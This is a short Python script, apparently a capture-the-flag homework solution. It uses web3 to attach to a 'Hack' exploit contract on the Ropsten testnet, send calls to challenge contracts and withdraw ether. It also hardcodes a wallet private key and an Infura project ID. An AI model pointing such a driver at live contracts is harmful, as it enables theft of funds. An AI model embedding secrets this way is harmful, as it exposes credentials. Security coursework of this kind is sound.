from web3 import Web3, HTTPProvider
from solc import compile_files
import os

myAddress = '0xB3580FB6944BC704149CE71DF2247897755Ba7d7'
myKey = '0x7613f3f0e75e124b78280cde672d5870ea87ebdea19aca556e1c6a720e8fbe82'
w3 = Web3(HTTPProvider(r'https://ropsten.infura.io/v3/6a17ad8ec1ff4b5c97d809725b515aac'))

def call(function, value):
    txn = function.buildTransaction({'value': w3.toWei(value, 'ether'), 'nonce': w3.eth.getTransactionCount(myAddress), 'gas': w3.eth.getBlock("latest").gasLimit, 'gasPrice': w3.toWei('1000', 'gwei')})
    sign = w3.eth.account.sign_transaction(txn, myKey)
    return w3.eth.sendRawTransaction(sign.rawTransaction)

os.environ['SOLC_BINARY'] = '/mnt/c/Users/B10515025/Desktop/NTUST_CTF/HW3/solc.exe'
ALL_OUTPUT_VALUES = ("abi", "asm", "ast", "bin", "bin-runtime", "devdoc", "interface", "opcodes", "userdoc",)
compiled_sol = compile_files(['./Hack.sol'], output_values = ALL_OUTPUT_VALUES)

#Hack = w3.eth.contract(abi = compiled_sol['./Hack.sol:Hack']['abi'], bytecode = compiled_sol['./Hack.sol:Hack']['bin'])
#hash = call(Hack.constructor('Hack'), 0).hex()
#print(hash)

hash = '0x34b53c82ea56e126e9f1d17ed997a222981af8c3b9f55e023a2e53efc152e499'
address = w3.eth.getTransactionReceipt(hash)['contractAddress']
print(address)

Hack = w3.eth.contract(address = address, abi = compiled_sol['./Hack.sol:Hack']['abi'])
#call(Hack.functions.create('0x84Fb598A7E8d58715d3C5F2E789570D7B5B0e290'), 0.5)
#call(Hack.functions.run('0xD702dBC44510d26c9aDD85c1A54609eE3997276B'), 0.5)
#call(Hack.functions.validate('0x84Fb598A7E8d58715d3C5F2E789570D7B5B0e290', int('0x596b45d098c84789a2215d21b9794fb8e4e4defac65140463b4677ee4ff107a8',16)), 0)
call(Hack.functions.withdraw(), 0)